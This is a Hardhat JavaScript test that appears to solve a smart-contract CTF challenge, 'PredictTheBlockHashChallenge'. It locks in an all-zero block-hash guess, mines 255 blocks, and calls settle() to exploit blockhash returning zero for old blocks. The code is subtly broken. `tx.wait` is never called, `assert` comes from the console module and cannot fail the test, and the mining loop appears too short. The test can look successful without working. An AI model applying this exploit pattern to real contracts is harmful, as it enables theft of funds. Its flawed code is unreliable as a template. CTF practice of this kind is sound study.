const { ethers } = require("hardhat");
const { expect } = require("chai");
const { assert } = require("console");

before(async () => {
  challenge = await ethers.getContractFactory("PredictTheBlockHashChallenge")
      .then((factory) => factory.deploy( { value: ethers.utils.parseEther("1") } ));
});
 
  it('predicts the block hash', async () => {
    let guess = "0x0000000000000000000000000000000000000000000000000000000000000000";

    const blockNumber = await ethers.provider.getBlockNumber();
    console.log("Current block number:", blockNumber);

    const tx = await challenge.lockInGuess(guess , { value: ethers.utils.parseEther("1") })
    await tx.wait

    // await network.provider.send("evm_increaseTime", [4600])
    // await network.provider.send("evm_mine", [Date.now() + 256]);
    for (let i = 0; i < 255; i++) {
        await network.provider.send("evm_mine");
    }

    const tx1 = await challenge.settle()
    await tx1.wait

    const blockNum = await ethers.provider.getBlockNumber();
    console.log("New block number:", blockNum);

    assert(
      await challenge.isComplete() === true,
      'Challenge has not been completed!'
    );
  });

